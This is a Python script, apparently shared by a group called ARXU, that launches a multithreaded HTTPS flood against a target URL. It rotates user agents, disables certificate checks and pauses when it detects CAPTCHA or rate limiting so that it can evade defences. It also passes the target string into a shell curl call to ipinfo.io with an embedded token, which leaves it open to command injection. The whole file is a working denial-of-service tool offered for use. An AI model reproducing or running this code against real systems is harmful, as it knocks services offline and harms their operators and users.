#Developer
#ARXU
#Telegram : t.me/teamARXU

import requests
import random
import threading
import time
import urllib3
import argparse
import logging
import subprocess
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Function to generate random user agents
def generate_user_agent():
    try:
        with open("ua.txt", "r") as file:
            user_agents = file.readlines()
        return random.choice(user_agents).strip()
    except FileNotFoundError:
        logging.error("ua.txt file not found.")
        return ""

# Function to fetch target information
def get_target_info(target):
    try:
        command = f'curl "ipinfo.io/{target}?token=ea645bb4d3ee99"'
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            return json.loads(result.stdout)
        else:
            logging.error(f"Failed to fetch target information: {result.stderr}")
            return {}
    except Exception as e:
        logging.error(f"An error occurred while fetching target information: {str(e)}")
        return {}

# Function to send HTTPS flood attack
def https_flood(target_url, num_threads, duration):
    start_time = time.time()
    end_time = start_time + duration
    while time.time() < end_time:
        try:
            headers = {
                "User-Agent": generate_user_agent(),
                # Add any other necessary headers
            }
            response = requests.get(target_url, headers=headers, verify=False)  # Disable SSL verification
            
            # Response monitoring and behavioral analysis
            if response.status_code == 403:
                logging.warning("Defense mechanism detected: CAPTCHA challenge")
                time.sleep(60)  # Temporarily reduce attack intensity
            elif response.status_code == 429:
                logging.warning("Defense mechanism detected: Rate limiting")
                time.sleep(60)  # Temporarily reduce attack intensity
            else:
                pass
                
        except Exception as e:
            logging.error(f"An error occurred: {str(e)}")

    logging.info("HTTPS Attack is successfully launched.")

def main():
    # Setup logging
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    # Your logo
    logo = """
       \033[95m___        _               ___            _   
      / __|___ __| |_ _ _ ___ _ _| _ \___ ___ __| |_ 
     | (__/ -_) _|  _| '_/ -_) ' \  _/ -_) -_|_-<  _|
      \___\___\__|\__|_| \___|_||_|_| \___\___/__|_|  \033[0m
    """

    print(logo)

    parser = argparse.ArgumentParser(description='Launch an HTTPS flood attack.')
    parser.add_argument('target_url', type=str, help='Target URL')
    parser.add_argument('num_threads', type=int, help='Number of threads')
    parser.add_argument('duration', type=int, help='Attack duration in seconds')
    args = parser.parse_args()

    # Gather target information
    target_info = get_target_info(args.target_url)
    print("Target Information:", target_info)

    # Start logging
    logging.info("Launching HTTPS attack...")

    # Start the HTTPS attack
    threads = []
    for _ in range(args.num_threads):
        thread = threading.Thread(target=https_flood, args=(args.target_url, args.num_threads, args.duration))
        thread.start()
        threads.append(thread)

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    logging.info("All threads have finished.")

if __name__ == "__main__":
    main() 
